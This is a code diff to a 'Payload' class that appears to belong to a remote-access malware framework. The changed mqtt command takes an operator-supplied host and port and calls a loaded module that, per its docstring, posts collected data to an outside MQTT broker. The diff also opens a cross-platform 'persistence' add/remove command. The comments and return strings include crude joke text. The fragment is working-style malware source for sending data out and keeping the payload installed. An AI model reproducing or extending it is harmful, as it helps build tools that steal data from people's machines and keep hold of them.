@@ -951,15 +951,23 @@ class Payload():
         Post relevant data to an MQTT broker
         Or up my butt.
         """
-        try:
-            if 'mqtt' not in globals():
-                self.load('mqtt')
-            run_this = globals()['mqtt'].run()
-            return 'Shit just got run'
-        except Exception as e:
-            result = "something is messed up with MQTT. Not sure what yet, but we got to payload exception."
-            log(result)
-            return result
+        if 'mqtt' not in globals():
+            self.load('mqtt')
+        arguments = str(args).split()
+        if len(arguments) == 2:
+            host, port = arguments
+            print("success!")
+            try:
+                globals()['mqtt'].run(host, port)
+                return "Shit just got run."
+            except Exception as e:
+                result = "mqtt error: {}".format(str(e))
+                log(result)
+                return result
+        else:
+            print(self.mqtt.usage)
+            return self.mqtt.usage
+        return "This is a test."
     
     @config(platforms=['win32','linux2','darwin'], command=True, usage='persistence <add/remove> [method]')        
     def persistence(self, args=None):
